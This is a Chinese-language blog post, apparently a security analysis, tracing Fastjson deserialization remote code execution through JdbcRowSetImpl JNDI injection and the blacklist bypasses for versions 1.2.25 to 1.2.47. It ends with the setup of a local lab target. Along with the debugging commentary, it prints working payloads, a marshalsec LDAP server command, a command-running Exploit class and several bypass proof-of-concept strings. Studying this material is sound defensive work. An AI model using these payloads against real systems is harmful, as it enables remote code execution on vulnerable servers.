+<p><img src="https://p0.ssl.qhimg.com/t015cd5093d1ee3a09b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://p4.ssl.qhimg.com/t01549470c20b3f13f6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>影响版本：fastjson &lt;&#x3D; 1.2.24</p>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>从前文的TemplatesImpl链分析中得知FastJson在反序列化时会去调用get、set、is方法。</p>
+<ul>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/type">@type</a>：</strong>目标反序列化类名；</li>
+<li><strong>dataSourceName：</strong>RMI注册中心绑定恶意服务；</li>
+<li><strong>autoCommit</strong>：在Fastjson JdbcRowSetImpl链中反序列化时，会去调用setAutoCommit方法。</li>
+</ul>
+<p>详细分析fastjson如何解析可查看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14601670.html">Fastjson TemplatesImpl链分析</a>文章，再次不做赘诉。</p>
+<p>启动LDAP服务端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/<span class="hljs-comment">#Exploit 1389</span><br></code></pre></td></tr></table></figure>
+
+<p>Exploit代码，需将代码编译成class文件然后挂在到web中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>POC代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.nice0e3;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//               String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(PoC);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://p0.ssl.qhimg.com/t0129cffe59ddb4ca02.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>看到payload中的<code>dataSourceName</code>参数在解析时候则会调用<code>setDataSourceName</code>对<code>DataSourceNamece</code>变量进行赋值，来看到代码</p>
+<p><img src="https://p0.ssl.qhimg.com/t01d87c5c339e87266a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而<code>autoCommit</code>也一样会调用<code>setAutoCommit</code></p>
+<p><img src="https://p2.ssl.qhimg.com/t019c723b2e9d2dd9a5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">setAutoCommit`方法调用`this.connect()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://p5.ssl.qhimg.com/t011533f9b9d6417623.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>lookup中则是传入了<code>this.getDataSourceName()</code>，返回dataSource变量内容。而这个dataSource内容则是在前面<code>setDataSourceName</code>方法中进行设置的，该参数是可控的。所以可以进行JDNI注入从而达到命令执行。</p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ul>
+<li>-&gt; JdbcRowSetImpl.execute()</li>
+<li>-&gt; JdbcRowSetImpl.prepare()</li>
+<li>-&gt; JdbcRowSetImpl.connect()</li>
+<li>-&gt; InitialContext.lookup(dataSource)</li>
+</ul>
+<p>而在Fastjson JdbcRowSetImpl 链利用中，则是利用了后半段。</p>
+<h2 id="0x02-绕过方式"><a href="#0x02-绕过方式" class="headerlink" title="0x02 绕过方式"></a>0x02 绕过方式</h2><h3 id="1-2-25版本修复"><a href="#1-2-25版本修复" class="headerlink" title="1.2.25版本修复"></a>1.2.25版本修复</h3><p>先将Fastjson组件升级到1.2.25版本后进行发送payload，查看是否能够利用成功。</p>
+<p><img src="https://p2.ssl.qhimg.com/t01085a5b6ca5669e95.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>修复改动：</p>
+<ol>
+<li>自从1.2.25 起 autotype 默认为False</li>
+<li>增加 checkAutoType 方法，在该方法中进行黑名单校验，同时增加白名单机制</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/enable_autotype">Fastjson AutoType说明</a></p>
+<p>根据官方文档开启AutoType的方式，假设不开启该功能是无法进行反序列化的。因为默认白名单是空的，需要自定义。白名单的绕过基本不可能，都是从黑名单作为入口。白名单需要添加，而黑名单中则是内置在Fastjson中。</p>
+<h4 id="1、JVM启动参数"><a href="#1、JVM启动参数" class="headerlink" title="1、JVM启动参数"></a>1、JVM启动参数</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">-Dfastjson.parser.autoTypeSupport</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2、代码中设置"><a href="#2、代码中设置" class="headerlink" title="2、代码中设置"></a>2、代码中设置</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ParserConfig<span class="hljs-selector-class">.getGlobalInstance</span>()<span class="hljs-selector-class">.setAutoTypeSupport</span>(true);<br></code></pre></td></tr></table></figure>
+
+<p>下面来看代码，这里使用了IDEA中的jar包对比功能</p>
+<p><img src="https://p3.ssl.qhimg.com/t01b82012d0e7ab7d26.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以看到<code>DefaultJSONParser</code>发送了变动，在这里多了一个<code>checkAutoType</code>方法去做校验。</p>
+<p>跟进方法查看</p>
+<p><img src="https://p4.ssl.qhimg.com/t01ff09cbbfe74b70b2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>前面会进行白名单的校验，如果匹配中的话调用loadClass加载，返回一个Class对象。 这里默认白名单的列表为空。</p>
+<p><img src="https://p4.ssl.qhimg.com/t0137bc6df439407d56.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>后面这则是会恶意类的黑名单进行匹配，如果加载类的前面包含黑名单所定义的字符则抛出异常。</p>
+<h3 id="1-2-25-1-2-41-绕过"><a href="#1-2-25-1-2-41-绕过" class="headerlink" title="1.2.25-1.2.41 绕过"></a>1.2.25-1.2.41 绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.nice0e3;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(PoC);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>先来调试不开启的情况，前面依旧就会遍历黑名单对class进行赋值，但最后这个会去检测如果未开启，则直接抛异常，开启则会去返回。</p>
+<p><img src="https://p3.ssl.qhimg.com/t0197a9793be67543f6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>将注释打开后，则直接返回class</p>
+<p><img src="https://p3.ssl.qhimg.com/t019f5d6fb159fdfd30.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://p2.ssl.qhimg.com/t0107703cb32293aaf7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>命令执行成功。但是可以看到前面的class是<code>Lcom.sun.rowset.JdbcRowSetImpl</code>为什么也会触发命令执行？</p>
+<p>原因在于<code>com.alibaba.fastjson.parser#TypeUtils.loadClass(typeName, this.defaultClassLoader);</code>方法中，可跟进查看。</p>
+<p><img src="https://p1.ssl.qhimg.com/t01cd5cb6193f67c67a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://p0.ssl.qhimg.com/t01dea2fd740cc515fe.png" srcset="/img/loading.gif" lazyload alt="img"><br>这里解析到内容如果为<code>L</code>开头，<code>;</code>结尾的话就会将这2个字符清空，前面其实还有一个<code>[</code>。</p>
+<h3 id="1-2-42-修复方式"><a href="#1-2-42-修复方式" class="headerlink" title="1.2.42 修复方式"></a>1.2.42 修复方式</h3><p>修复改动：明文黑名单改为HASH值,<code>checkcheckAutoType</code>方法添加<code>L</code>和<code>;</code>字符过滤。</p>
+<p><img src="https://p2.ssl.qhimg.com/t01badc70d5e064dd47.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>加密方法位于<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>可将进行碰撞获取值。</p>
+<h3 id="1-2-42绕过方式"><a href="#1-2-42绕过方式" class="headerlink" title="1.2.42绕过方式"></a>1.2.42绕过方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.nice0e3;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(PoC);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://p0.ssl.qhimg.com/t01dd61f1b4877d4b43.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在<code>com.alibaba.fastjson.parser#checkcheckAutoType</code>中将<code>L</code>和<code>;</code>进行清空。这里是利用了双写的方式，前面的规则将第一组<code>L</code>和<code>;</code>，进行清空，而在<code>TypeUtils.loadclass</code>中将第二组内容清空。</p>
+<p><img src="https://p2.ssl.qhimg.com/t01f08e253e7ca114bc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="1-2-43-修复方式"><a href="#1-2-43-修复方式" class="headerlink" title="1.2.43 修复方式"></a>1.2.43 修复方式</h3><p>在1.2.43版本中对了LL开头的绕过进行了封堵</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//hash计算基础参数            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            //L开头，；结尾            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;                //LL开头                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) &#123;                                      throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125;                className = className.substring(1, className.length() - 1);            &#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>再次执行poc代码可以看到报错了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. LLcom.sun.rowset.JdbcRowSetImpl;;    at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:<span class="hljs-number">914</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:<span class="hljs-number">311</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="hljs-number">1338</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="hljs-number">1304</span>)    at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="hljs-number">152</span>)    at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="hljs-number">162</span>)    at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="hljs-number">131</span>)    at com.nice0e3.POC.main(POC.java:<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-2-43-绕过方式"><a href="#1-2-43-绕过方式" class="headerlink" title="1.2.43 绕过方式"></a>1.2.43 绕过方式</h3><p>前面可以看到<code>[</code>也进行了清空，可以从该地方进行入手。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;        JSON.parse(PoC);    &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>执行报错了，报错信息如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="hljs-number">44</span>, fastjson-version <span class="hljs-number">1.2</span><span class="hljs-number">.43</span>    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:<span class="hljs-number">451</span>)    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:<span class="hljs-number">1261</span>)    at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JdbcRowSetImpl.deserialze(Unknown Source)    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:<span class="hljs-number">267</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:<span class="hljs-number">729</span>)    at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:<span class="hljs-number">183</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:<span class="hljs-number">373</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="hljs-number">1338</span>)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="hljs-number">1304</span>)    at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="hljs-number">152</span>)    at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="hljs-number">162</span>)    at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="hljs-number">131</span>)    at com.nice0e3.POC.main(POC.java:<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure>
+
+<p>提示缺少了一个<code>&#123;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;        JSON.parse(PoC);    &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://p4.ssl.qhimg.com/t01a65e0a6a8c9bf872.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="1-2-44-修复方式"><a href="#1-2-44-修复方式" class="headerlink" title="1.2.44 修复方式"></a>1.2.44 修复方式</h3><p>将<code>[</code>进行限制，具体实现可自行查看。</p>
+<p>再次执行前面的poc代码可以看到报错了。</p>
+<h3 id="1-2-45绕过方式"><a href="#1-2-45绕过方式" class="headerlink" title="1.2.45绕过方式"></a>1.2.45绕过方式</h3><p>利用条件需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;&#125;&quot;</span>;        JSON.parse(PoC);    &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t012608e2ea52b3dd17.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>下面来分析一下使用这个payload为什么能绕过。其实是借助了<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>进行绕过，<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>并不在黑名单中。</p>
+<p>这里是对反序列化后的对象是<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
+<p>传入<code>properties</code>参数，则会去自动调用<code>setProperties</code></p>
+<p><img src="https://p3.ssl.qhimg.com/t011aa3809b12daa113.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://p5.ssl.qhimg.com/t01ed4a4e87b35deb83.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://p0.ssl.qhimg.com/t010c3eff789e81b509.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而在1.2.46无法执行成功，应该是对该类拉入了黑名单中。</p>
+<h2 id="1-2-25-1-2-47通杀"><a href="#1-2-25-1-2-47通杀" class="headerlink" title="1.2.25-1.2.47通杀"></a>1.2.25-1.2.47通杀</h2><p>为什么说这里标注为通杀呢，其实这里和前面的绕过方式不太一样，这里是可以直接绕过<code>AutoTypeSupport</code>，即便关闭<code>AutoTypeSupport</code>也能直接执行成功。</p>
+<p>先来看payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;              <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/badNameClass\&quot;,\n&quot;</span> +                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +                <span class="hljs-string">&quot;&#125;&quot;</span>;        JSON.parse(PoC);    &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://p0.ssl.qhimg.com/t017e59d2c838a66464.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以看到payload和前面的payload构造不太一样，这里来分析一下。</p>
+<p><img src="https://p4.ssl.qhimg.com/t01be2cec57b0dd6279.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里未开启<code>AutoTypeSupport</code>不会走到下面的黑白名单判断。</p>
+<p>fastjson会使用 <code>checkAutoType</code> 方法来检测<code>@type</code>中携带的类，但这次我们传入的是一个<code>java.lang.class</code></p>
+<p><img src="https://p3.ssl.qhimg.com/t01c05ff78da55bf60f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>来看到<code>com.alibaba.fastjson.parser.DefaultJSONParser.class#parseObject</code>方法中</p>
+<p><img src="https://p5.ssl.qhimg.com/t01f1e3bd2ae6032b79.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>跟进<code>deserialze</code>方法查看，这里的<code>deserialze</code>是<code>MiscCodec#deserialze</code></p>
+<p>上面代码会从<code>objVal = parser.parse();</code>获取内容为<code>com.sun.rowset.JdbcRowSetImpl</code>。来看到下面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == Class.class) &#123;    <span class="hljs-keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里使用了<code>TypeUtils.loadClass</code>函数加载了<code>strVal</code>，也就是JdbcRowSetlmpl，跟进发现会将其缓存在map中。</p>
+<p><img src="https://p0.ssl.qhimg.com/t0172673d9beca65dd0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里的true参数代表开启缓存，如果开启将恶意类存储到mapping中</p>
+<p><img src="https://p0.ssl.qhimg.com/t01126b2b2b27e4d2c1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>断点来到<code>com.alibaba.fastjson.parser.DefaultJSONParser#checkAutoType</code></p>
+<p><img src="https://p5.ssl.qhimg.com/t015289d9c5a3536680.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>因为前面将<code>com.sun.rowset.JdbcRowSetImpl</code>所以这里能获取到<code>com.sun.rowset.JdbcRowSetImpl</code>该判断不为true，从而绕过黑名单。</p>
+<p><img src="https://p0.ssl.qhimg.com/t019d07272675385707.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而后续则是和前面的一样，通过<code>dataSourceName</code>触发对于的set方法将<code>dataSourceName</code>变量进行设置，而后通过<code>autoCommit</code>,触发<code>setAutoCommit</code>触发<code>lookup()</code>达到命令执行。</p>
+<p>创建环境</p>
+<p><img src="C:\Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230706204008933.png" srcset="/img/loading.gif" lazyload alt="image-20230706204008933"></p>
+<p>对目标机进行端口扫描，发现8090端口</p>
+<p><img src="C:\Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230706204113554.png" srcset="/img/loading.gif" lazyload alt="image-20230706204113554"></p>
+<p>访问服务</p>
+<p><img src="C:\Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230706204222252.png" srcset="/img/loading.gif" lazyload alt="image-20230706204222252"></p>
+<p>我们向这个地址POST一个JSON对象，即可更新服务端的信息：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(kali㉿kali)</span>-[~]<br>└─$ curl http:<span class="hljs-string">//192.168.233.133</span><span class="hljs-function">:8090</span>/ -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> <span class="hljs-params">--data</span> &#x27;&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;age&quot;</span><span class="hljs-function">:20</span>&#125;&#x27;<br>&#123;<br>        <span class="hljs-string">&quot;age&quot;</span><span class="hljs-function">:20</span>,<br>        <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;hello&quot;</span><br>&#125;       <br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
